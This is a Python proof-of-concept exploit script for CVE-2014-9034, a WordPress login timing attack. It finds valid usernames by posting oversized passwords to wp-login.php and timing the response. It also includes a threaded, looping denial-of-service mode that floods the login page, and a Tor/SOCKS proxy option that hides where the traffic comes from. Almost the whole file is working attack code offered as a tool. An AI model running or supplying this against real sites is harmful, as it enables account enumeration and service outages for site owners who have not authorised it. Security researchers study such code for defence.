#!/usr/bin/python
# -*- coding: utf-8 -*-

import urllib2
import urllib
import httplib
import time
import socks
import socket
import argparse
import sys
from threading import *
from BeautifulSoup import BeautifulSoup
import requests
WPCurrent_URL = "http://wordpress.org/download/"

__license__="""

A PoC Python script to exploit Wordpress User Enumeration Time-Based Attack:

Authors:
	c0r3dump | http://www.devconsole.info 
	Javier Nieto | http://www.behindthefirewalls.com/	

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.

The authors disclaims all responsibility in the use of this tool.

"""

def wpCheckversion(url):
	try:
		readme = urllib2.urlopen(url+"/readme.html")
		soupreadme = BeautifulSoup(readme)
		version = soupreadme.find('h1')
		location = str(version).find("Versi")
		print "[+] Wordpress version found: ",
		if location != -1: 
			print str(version)[(location + 8):(location + 14)].split("\n")[0]
			wpCurrentVersion = urllib2.urlopen(WPCurrent_URL)
			soupwpCurrentVersion = BeautifulSoup(wpCurrentVersion)
			versionwpCurrentVersion = soupwpCurrentVersion.find('div', attrs={'class': 'col-3'}).find('p', attrs={'class': 'download-meta'}).find('strong').contents[0].split(';')[2]
			print "[+] Wordpress last public version: "+str(versionwpCurrentVersion)
        	else:
			print "Not result"

	except URLError:
            print ""
            print "[-] Can't open URL especified: \"" + url + "\""
            print ""

def checkTor(ip):
	ip_exit_tor_relay=[]
	tor = urllib.urlopen('http://torstatus.blutmagie.de/ip_list_exit.php/Tor_ip_list_EXIT.csv')
	for ip_tor in tor.readlines():
		ip_tor = ip_tor.replace("\n","")
		ip_exit_tor_relay.append(ip_tor)
	if ip in ip_exit_tor_relay:
		print " it's a TOR exit node."
	else:
		print " it's NOT a TOR exit node."
	

def proxyConn(hostp,portp):

	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, hostp, int(portp))
	socket.socket = socks.socksocket

def url_ok(url):
	ip = requests.get('http://httpbin.org/ip').json['origin']
	print "[+] Your IP: " + str(ip),
	checkTor(ip)

	try:
		reqok = urllib2.urlopen(url)
		print "[+] The server " + "it's responding the status code: " + str(reqok.code) 
	
	except urllib2.HTTPError,e:
		print "[-]The server it's not responding ... " + str(e)
		exit(1)

	except httplib.BadStatusLine: 
		print "[-]The server it's not responding ... " + str(e)
		exit(1)

	except urllib2.URLError:
		print "[-]Unable to connect to " + str(url) 
		exit(1)		

	except ValueError,e:
		
		print "[-]Unable to connect " + str(e) + " . You need to put the complete URL (http://...)"
		exit(1)


def DosWP(url,user,chars):

	urlog=str(url)+'/wp-login.php'
	headers = [
		("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5")]

	password = "A"*chars
	data = [
		("log",user), 
		("pwd",password), 
		("testcookie",1), 
		("submit","Log In"), 
		("redirect_to",url+"/wp-admin/"), 
		("rememberme","forewer")]

	
	timeStart = int(time.time())
	
	req = urllib2.Request(urlog, urllib.urlencode(dict(data)), dict(headers))

	try:

		response = urllib2.urlopen(req)

	except urllib2.URLError:
		
		pass


	except urllib2.HTTPError,e:

		print "[-]Error to open " + str(urlog) 
		print e.code


def ScanWP(url,user,chars):
	
	urlog=str(url)+'/wp-login.php'
	headers = [
		("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5")]

	password = "A"*chars
	data = [
		("log",user), 
		("pwd",password), 
		("testcookie",1), 
		("submit","Log In"), 
		("redirect_to",url+"/wp-admin/"), 
		("rememberme","forewer")]
	print "Testing user " + str(user) + " @ " + urlog + " ..."
	
	timeStart = int(time.time())
	
	req = urllib2.Request(urlog, urllib.urlencode(dict(data)), dict(headers))

	try:

		response = urllib2.urlopen(req)

	except urllib2.URLError:

		print "[-]Unable to connect to " + str(urlog) 
		exit(1)

	except urllib2.HTTPError,e:

		print "[-]Error to open " + str(urlog) 
		print e.code
		exit(1)

	except ValueError,e:

		print "[-]Unable to connect to " + str(urlog) 
		print e
		exit(1)

	timeDone = int(time.time())

	delay = timeDone-timeStart
	defTime = 10

	if delay > defTime:
		print "[+]The user " + str(user) + " exist. " + "Response time " + str(delay) + " second(s)."
		return user

	else:
		print "[-]The user " + str(user) + " don't exist. " + "Response time " + str(delay) + " second(s)."
	



def main():
	parse = argparse.ArgumentParser(description='Python script for Wordpress User Enumeration Time-Based Attack CVE-2014-9034')
	parse.add_argument('-u','--url', action='store', dest='url', help='URL to scan (http://127.0.0.1)')
	parse.add_argument('-U','--user', action='store', dest='user', help='User to scan')
	parse.add_argument('-f','--file', action='store', dest='ufile', help='File with user names')
	parse.add_argument('-n','--num', action='store', dest='num',default='1000000', help='Number of characters to use (default 1000000)')
	parse.add_argument('-d','--dos', action='store', dest='dos', help='Try to stablish a DOS condition')
	parse.add_argument('-t','--threads', action='store', dest='td',default='10', help='Number of connections attemps (every 10 seconds) for the DOS attack (default 10)')
	parse.add_argument('--proxy', action='store', dest='proxy', help='SOCKS 5 proxy, tipically TOR use: 127.0.0.1:9050')

	arg=parse.parse_args()
	users=[]
	userfdos=[]
	numuser = 0
	
	if arg.url == None:
 		parse.print_help()
 		exit(1)
	if arg.user == None and arg.ufile == None:
		parse.print_help()
		exit(1)
	if arg.user != None:
		users.append(arg.user)
		numuser = numuser + 1
	
	if arg.ufile != None:
		try:
			userFile = open (arg.ufile,'r')
			
			for line in userFile.readlines():
				line = line.split("\n")
				users.append(line[0])
				numuser = numuser + 1
		except IOError:
			print "The file %s doesn't exist." % (arg.ufile)
			print "Nothing to do."
			exit(1)
	
	chars = int(arg.num)
	if chars > 9000000:
		print "[-]Too many characters. Please use a value less than 2000000"
		exit(1)
	if chars < 50000:
		print "[-]Too few characters. Please use a value greater than 500000"
		exit(1)
	
	url = arg.url
	if url.find("http://") == -1:
		url = "http://"+url
	
	print "Starting Wordpress User Enumeration Time-Based Attack Python CVE-2014-9034 script (PoC) for " + url + " at " + time.strftime("%x") + " " + time.strftime("%X") + " ..."

	if arg.proxy != None:
		hostp = arg.proxy.split(":")[0]
		portp = arg.proxy.split(":")[1]
		proxyConn(hostp,portp)

	url_ok(url)	
	wpCheckversion(url)
	print 
	print "[+]Searching for " + str(numuser) + " valid users, using " + arg.num + " characters."
	
	for user in users:
		usr=ScanWP(url,user,chars)
		if usr != None:
			userfdos.append(usr)
		else:
			userfdos.append(None)
	
 	ufd = None	
	for u in userfdos:
		if u != None:
			ufd = u

	if arg.dos == True:

		if ufd != None:
			threads = int(arg.td)
			user = ufd
		 	attp = 0
			print
			while 1:
				print "[+]Trying DOS with user " + str(user) + " using " + str(threads) + " connections attemps." 
				for att in range(threads):
					t = Thread(target=DosWP, args=(url, user, chars))
					try:
						t.start()
						attp = attp + 1
					except:
	      					pass 
				print "[+]After " + str(attp) + " connections attemps waiting 10 seconds in order to check the status of the server ..,"
				time.sleep(10)
				print "[+]Checking the server respond ...."
				url_ok(url)
				
		else:
			print "[-]No valid user found, impossible to make the DOS attack."
			exit(1)


if __name__=='__main__':
	main()
